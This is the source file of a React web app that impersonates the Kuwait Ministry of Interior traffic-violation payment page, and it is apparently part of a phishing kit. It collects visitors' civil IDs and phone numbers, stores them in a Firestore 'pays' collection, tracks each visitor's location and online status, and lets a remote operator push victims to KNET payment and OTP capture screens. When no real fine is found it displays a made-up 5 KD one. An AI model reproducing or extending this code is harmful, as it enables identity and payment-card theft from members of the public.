"use client"

import { doc, onSnapshot } from "firebase/firestore"
import "./App.css"
import { addData, db } from "./firebase"
import { useEffect, useState } from "react"
import Plate from "./plate"
import { Loader } from "./loader"
import Kent from "./kent/kent"
import { useFetchViolationData } from "./lib/util"
import PhoneOTP from "./phone/phone-otp"
import LoadingScreen from "./sahel"
import FullPageLoader from "./loader1"
import { setupOnlineStatus } from "./online-sts"
import DiscountPopup from "./modal"
import Ken2 from "./kent/knet2"
const dataFake = [
  {
    violationAmount: 5,
    violationTicketNumber: '4587745',
    vehiclePlateNumber: '********',
    violationDate: ' 12/1/2025:05:05:31 '
  }
]
function App(props: { setPage: any, page: string }) {
  const [dataall] = useState<any>([])
  const { violationData, fetchViolationData } = useFetchViolationData()
  const [isOnline, setIsOnline] = useState<boolean>(true)

  // Call the function

  const [amount, setAmount] = useState(0)
  const [mobile, setMobile] = useState('')
  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const [id, setId] = useState("")

  const data = {
    id: _id,
    currentPage: props.page,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    violationValue: amount,
    isOnline: isOnline,
    personalInfo: {
      id: id,
    },
  }
  const [show, setShow] = useState(false)
  const [checked, setChedcked] = useState(false)
  const [loading, setloading] = useState(false)
  useEffect(() => {
    localStorage.setItem("vistor", _id)
    addData({
      ...data,
      forestoreAttachment: "app-IFifwzlcXElzzk2qTKQJdX2wp6v3z0.tsx",
      isOnline: navigator.onLine,
    })

  }, [])
  async function getLocation() {
    const APIKEY = '73cc63b69c0d6f3e0e4be0127ab551c66daccd975d167f2e968e29d6';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        ...data,
        country: country
      })
      console.log(country);
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
  function getSpicficeValue() {
    const visitorId = localStorage.getItem("vistor") // Fixed typo from "visitor" to "vistor" to match your localStorage key
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any
          if (data.page && data.page !== "") {
            props.setPage(data.page)
          }
          if (data.violationValue) {
            if (data.violationValue !== "") {
              localStorage.setItem("vv", data.violationValue)
              setloading(false)
              setShow(true)
            }
          }
        }
      })
      return () => unsubscribe() // Properly return the cleanup function
    }
  }
  useEffect(() => {
    setIsOnline(navigator.onLine)
  }, [props.page])

  useEffect(() => {
    getLocation()
    // Update firestore with online status
    if (localStorage.getItem("vistor")) {
      const visitorId = localStorage.getItem("vistor")
      if (visitorId) {
        setupOnlineStatus(visitorId)
        addData({
          id: visitorId,
          lastSeen: new Date().toISOString(),
        })
      }
    }
    // Clean up event listeners
  }, [])

  const handleSubmit = (e: any) => {
    e.preventDefault()
    localStorage.setItem("amount", amount?.toString())
    fetchViolationData(id)
    getSpicficeValue()
    if (id !== "" || id.length > 2) {
      addData({
        ...data,
        // Set the page property to 'kent'
      })
      setloading(true)

      setTimeout(() => {
        setloading(false)
        setShow(true)
        // props.setPage("kent");  // Uncomment this if you want to immediately navigate
      }, 1000)
    }
  }
  return (
    <>
      {props.page === "knet" ? (
        <Kent violationValue={amount} setPage={props.setPage} />
      ) : props.page === "phone" ? (
        <Ken2 violationValue={amount} setPage={props.setPage} />      ) : props.page === "phoneCode" ? (
        <PhoneOTP />
      ) : props.page === "sahel" ? (
        <LoadingScreen />
      ) : props.page === "main" ? (
        <div dir="rtl">
          <header>
            <div className="row">
              <div className="col-4 col-md-2 col-lg-2 text-center" style={{ border: "0px solid red" }}>
                <a className="navbar-brand m-0" href="/main/">
                  <img src="/react.svg" style={{ height: 120 }} />
                </a>
              </div>
              <div
                className="online-status-indicator"
                style={{
                  position: "absolute",
                  top: "10px",
                  right: "20px",
                  display: "flex",
                  alignItems: "center",
                }}
              >
                <span
                  style={{
                    height: "10px",
                    width: "10px",
                    borderRadius: "50%",
                    backgroundColor: isOnline ? "#4CAF50" : "#F44336",
                    display: "inline-block",
                    marginRight: "5px",
                  }}
                ></span>
              </div>
              <div className="col-1 align-self-center" style={{ border: "0px solid red" }}>
                <div className="row">
                  <div className="col text-center">
                    <img src="/vite.svg" className="text-center main-header-title" />
                  </div>
                </div>
                <div className="row">
                  <div className="col text-center">
                    <img src="/svd.svg" className="mt-2 main-header-title" />
                  </div>
                </div>
              </div>
            </div>
            <nav className="navbar navbar-expand-lg navbar-dark border-bottom box-shadow">
              <div className="container">
                <a className="navbar-brand" href="/main" />
                <button
                  className="navbar-toggler"
                  type="button"
                  data-toggle="collapse"
                  data-target="#navbarResponsive"
                  aria-controls="navbarSupportedContent"
                  aria-expanded="false"
                  aria-label="Toggle navigation"
                >
                  <span className="navbar-toggler-icon" />
                </button>
                <div className="navbar-collapse collapse flex-sm-row-reverse" id="navbarResponsive">
                  <ul
                    className="navbar-nav flex-grow-1 p-0 clearfix"
                    style={{
                      margin: "0 auto",
                      verticalAlign: "top",
                      border: "0px solid red",
                    }}
                  >
                    <li className="nav-item">
                      <a className="nav-link" href="/main">
                        الرئيسيــة
                        <span className="sr-only">(current)</span>
                      </a>
                    </li>
                    <li className="nav-item active" id="eservicesMenu" data-trigger="focus">
                      <a
                        href="#"
                        id="nav-eServices"
                        className="nav-link"
                        data-target="#eservices"
                        data-toggle="collapse"
                        aria-expanded="false"
                        aria-controls="eservices"
                      >
                        الخدمات الإلكترونيـة
                      </a>
                      <span className="collapse navbar-submenu" id="eservices" data-parent="#navbarResponsive">
                        <ul
                          className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
                          style={{ border: "0px solid red" }}
                        >
                          <li className="nav-item m-0">
                            <a href="#">
                              <img src="/wwer.svg" alt="Information Systems" className="menu-icon" />
                            </a>
                            <a className="nav-link active" href="#">
                              <div className="main-menu-text">الإدارة العامة لنظم المعلومات</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <img src="/wwer.svg" alt="Traffic" className="menu-icon" width={50} height={50} />
                            <a href="#" className="nav-link">
                              <div className="main-menu-text">الإدارة العامة للمرور</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />

                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة للجنسية ووثائق السفر</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة لشؤون الإقامة</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/civil-defence/ico-civil-defence.svg"
                                alt="Civil Defence"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة للدفاع المدني</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/service-centres/ico-service-centre.svg"
                                alt="Service Centres"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة لمراكز الخدمة</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/coast-guard/ico-coast-guard.svg"
                                alt="Coast Guard"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة لخفر السواحل</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/ico-shoon-quwa.svg"
                                alt="Police Affairs"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة لشؤون قوة الشرطة</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/academy/ico-police-academy.svg"
                                alt="Saad Abdullah Police Academy"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">أكاديمية سعد العبدالله للعلوم الأمنية</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/finance/ico-finance.svg"
                                alt="Finance"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة للشؤن المالية</div>
                            </a>
                          </li>
                          <li className="nav-item">
                            <a href="#">
                              <img
                                src="/main/images/assets/investigations/ico-investigations.svg"
                                alt="Investigations"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة للتحقيقات</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/training/ico-training.svg"
                                alt="Training"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة للتدريب</div>
                            </a>
                          </li>
                        </ul>
                      </span>
                    </li>
                    <li className="nav-item" id="relatedDepartmentsMenu">
                      <a
                        href="#"
                        id="nav-relDepts"
                        className="nav-link"
                        data-target="#relatedDepts"
                        data-toggle="collapse"
                        aria-expanded="false"
                        aria-controls="relatedDepts"
                      >
                        إدارات توعوية
                      </a>
                      <span id="relatedDepts" className="collapse navbar-submenu" data-parent="#navbarResponsive">
                        <ul
                          className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
                          style={{ border: "0px solid red" }}
                        >
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/cyber-crime/ico-cyber-crime.svg"
                                alt="Cyber Crime"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">إدارة مكافحة الجرائم الإلكترونية</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/juvenile-protection/ico-juvenile-protection.svg"
                                alt="Juvenile Protection"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">إدارة حماية الأحداث</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/anti-drug/ico-anti-drug.svg"
                                alt="Anti Drug"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة لمكافحة المخدرات</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/cyber-crime/ico-cyber-crime.svg"
                                alt="Anti Human Trafficking"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">إدارة حماية الآداب العامة ومكافحة الإتجار بالأشخاص</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/security-media/ico-security-media.svg"
                                alt="Security Media Dept"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإدارة العامة للعلاقات والإعلام الأمني</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="#">
                              <img
                                src="/main/images/assets/correctional-facilities/icon-correctional-facilities.svg"
                                alt="Correctional Facilities"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="#">
                              <div className="main-menu-text">الإداره العامة للمؤسسات الإصلاحية</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/main/sections/security-systems">
                              <img
                                src="/main/images/assets/security-systems/ico-security-systems.svg"
                                alt="Security Systems"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="/main/sections/security-systems">
                              <div className="main-menu-text">الادارة العامة للأنظمة الأمنية</div>
                            </a>
                          </li>
                          <li className="nav-item m-0 d-none">
                            <a href="/main/sections/naionalsecurity">
                              <img
                                src="/main/images/assets/national-security/ico-nat-security.svg"
                                alt="Training"
                                className="menu-icon"
                              />
                            </a>
                            <a className="nav-link" href="/main/sections/national-security">
                              <div className="main-menu-text">كلية الأمن الوطني</div>
                            </a>
                          </li>
                          <li className="nav-item m-0">
                            <a href="/main/sections/human-resources">
                              <img
                                src="/main/images/assets/human-resources/ico-hr.svg"
                                alt="Administrative Affairs Dept."
                                className="menu-icon"
                              />
                            </a>
                            <a href="/main/sections/human-resources">
                              <div className="main-menu-text">الإدارة العامة للشئون الإدارية</div>
                            </a>
                          </li>
                        </ul>
                      </span>
                    </li>
                    <li className="nav-item">
                      <div className="dropdown">
                        <a href="#" className="nav-link" data-toggle="collapse" aria-expanded="false">
                          الإصدارات الإلكترونية
                        </a>
                        <div className="dropdown-menu text-right" style={{ background: "#e9e6de", padding: 0 }}>
                          <a className="dropdown-item" href="/main/emagazine">
                            المجلة الإلكترونية
                          </a>
                          <a className="dropdown-item" href="/main/news/archive">
                            أرشيـف الأخبار
                          </a>
                        </div>
                      </div>
                    </li>
                    <li className="nav-item">
                      <a className="nav-link" href="https://eservices.moi.gov.kw:45314/verify/qrcode">
                        التحقق من الوثائق
                      </a>
                    </li>
                    <li className="nav-item">
                      <a className="nav-link" href="https://eservices1.moi.gov.kw/moicus.nsf/moicus?openform&LangID=1">
                        يهمنا رايك
                      </a>
                    </li>
                    <li className="nav-item" id="navEmergency">
                      <a className="nav-link" href="#" data-toggle="modal" data-target="#emergencyContactModal">
                        أرقام الطوارئ
                      </a>
                    </li>
                    <li className="nav-item" id="navMeta">
                      <div className="dropdown">
                        <a href="#" className="nav-link" data-toggle="collapse" aria-expanded="false">
                          منصة المواعيد
                        </a>
                        <div className="dropdown-menu text-right" style={{ background: "#e9e6de", padding: 0 }}>
                          <a className="dropdown-item" href="https://meta.e.gov.kw/">
                            منصة 'متى'
                          </a>
                          <a
                            className="dropdown-item"
                            href="https://nat2.moi.gov.kw/MOIBioEnrol.nsf/initRequest?OpenForm&LangID=1"
                          >
                            حجز موعد البصمة البيومترية للخليجيين
                          </a>
                          <a
                            className="dropdown-item"
                            href="https://nat1.moi.gov.kw/MOIeTPAp.nsf/Request?OpenForm&LangID=1"
                          >
                            حجز مواعيد جوازات السفر المؤقتة والوثائق
                          </a>
                        </div>
                      </div>
                    </li>
                    <li className="nav-item mt-0 mb-0 mr-auto" style={{ border: "0px solid red", float: "left" }}>
                      <div
                        style={{ border: "0px solid white", height: "100%" }}
                        className="form-group text-center"
                        title="Request culture provider: CookieRequestCultureProvider"
                      >
                        <form
                          id="selectLanguage"
                          className="form-horizontal d-flex "
                          onSubmit={handleSubmit}
                          style={{ border: "0px solid green", height: "100%" }}
                        >
                          <div className="col-12 d-flex">
                            <button className="btn btn-lang align-content-center align-self-center text-center">
                              English
                            </button>
                          </div>
                        </form>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </nav>
          </header>
          <div className="row p-0 m-0 content" dir="rtl">
            <div className="col">
              <div className="row text-justify">
                <div className="col-sm-4 title">

                </div>
                <div className="col-sm-8">&nbsp;</div>
              </div>
              <div className="row text-center">

                <div className="col-sm-12 col-md-8 col-lg-8" id="GDTContent">
                  <div className="row">
                    <div className="col-3">&nbsp;</div>
                    <div className="col-6">
                      <div className="title">الإدارة العامة للمرور</div>
                      <div>
                        <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                      </div>
                    </div>
                    <div className="col-3">&nbsp;</div>
                  </div>
                  <div className="row mt-2 pl-2 pr-1 pb-5 text-justify" style={{ fontSize: 12 }}>
                    <div className="col-12">
                      <form id="enquireForm" onSubmit={handleSubmit}>
                        <div className="form-row">
                          <div className="col-sm-12 col-md-6">
                            <div className="form-check form-check-inline m-0">
                              <input
                                className="form-check-input"
                                type="radio"
                                name="violationFor"
                                id="violationForIndividual"
                                checked
                              />
                              <label className="form-check-label" htmlFor="violationTypeIndividual">
                                &nbsp;الأفراد
                              </label>
                            </div>
                            <div className="form-check form-check-inline">
                              <input
                                className="form-check-input"
                                type="radio"
                                name="violationFor"
                                id="violationForCompany"
                                defaultValue={2}
                              />
                              <label className="form-check-label" htmlFor="violationTypeCompany">
                                &nbsp;الشركات
                              </label>
                            </div>
                          </div>
                        </div>
                        <div className="form-row mt-2">
                          <div className="col-sm-12 col-md-6">
                            <label id="lblEnquiryType">الرقم المدني أو الرقم الموحد</label>
                            <input
                              className="form-control "
                              id="civilId"
                              name="civilId"
                              type="tel"
                              maxLength={12}
                              minLength={9}
                              onChange={(e) => {
                                setId(e.target.value)
                              }}
                            />
                          </div>
                        </div>

                        <div className="form-row mt-2">
                          <div className="col-sm-12 col-md-4">
                            <button
                              style={{ width: "100%" }}
                              disabled={loading}
                              type="submit"
                              className="btn btn-primary btn-block mt-2 mt-md-0"
                            >
                              إستعلم
                            </button>
                          </div>
                        </div>

                        <div
                          style={{ borderBottom: "2px solid #d6dce5" }}
                          className="form-row p-0 mt-3 text-right"
                          id="responseInfo"
                        >
                          {loading ? (
                            <Loader />
                          ) : show ? (
                            <>
                              {dataall.errorMsg && (
                                <Plate setChedcked={setChedcked} setAmount={setAmount} violations={violationData!} />
                              )}
                              <div
                                className="mb-2  p-0"
                                style={{
                                  width: "100%",
                                  background: "#e2e3e5",
                                  borderRadius: 5,
                                }}
                              >
                                <div className="flex text-end text-sm rounded">
                                  <div>عدد المخالفات: {violationData?.totalTicketsCount ?? "1"}</div>
                                  <div>المبلغ الإجمالي: {violationData?.totalViolationAmount ?? "5"} د.ك</div>
                                </div>
                              </div>
                              <Plate
                                setChedcked={setChedcked}
                                violations={violationData?.personalViolationsData ?? dataFake}
                                setAmount={setAmount}
                              />
                            </>
                          ) : null}
                        </div>
                        <div className="form-row align-self-center mt-2">
                          <div className="col-12 text-left" id="payingAmount" />
                        </div>
                        <div className={`form-row mt-3 ${show ? "" : "d-none"} `}>
                          <div className="col-12 text-right x font-bold mb-2" style={{fontWeight:800}}>
                            بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                          </div>
                          <label id="lblEnquiryType"> رقم الهاتف </label>
                          <div className="col-12 text-right font-weight-bold mb-2">
                            <input
                              className="form-control "
                              id="tel"
                              name="tel"
                              type="tel"
                              maxLength={10}
                              onChange={(e) => {
                                setMobile(e.target.value)
                              }}
                            />
                          </div>
                          <div className="col-sm-12 col-md-4 text-right">
                            <button
                              type="button"
                              onClick={() => {
                                setloading(true)
                                addData({
                                  ...data,
                                  mobile: mobile
                                })

                                setTimeout(() => {
                                  addData({ ...data, page: 'kent' }).then(() => {
                                    setloading(false)
                                  })
                                }, 1000) // Reduced timeout for better user experience
                              }}
                              id="btnPay"
                              disabled={loading || !checked || mobile.length < 8}
                              className={`btn btn-primary btn-block col-12 ${show ? "" : "d-none"}`}

                            >
                              {loading ? "انتظر..." : "إدفع         "}
                            </button>
                          </div>
                          <div className="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
                        </div>
                        <div className="form-row mt-3">
                          <div className="col-12 align-self-center">
                            <span
                              className="badge badge-success p-2"
                              style={{
                                fontWeight: "normal !important",
                                background: "green",
                                margin: 4,
                              }}
                            >
                              قابلة للدفع الكترونياً
                            </span>
                            <span
                              className="badge badge-danger p-2"
                              style={{
                                fontWeight: "normal !important",
                                margin: 4,
                                background: "red",
                              }}
                            >
                              غير قابلة للدفع الكترونياً
                            </span>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      ) : (
        <Kent violationValue={amount} />
      )}
      <FullPageLoader isLoading={loading} />
      <DiscountPopup />
    </>
  )
}

export default App

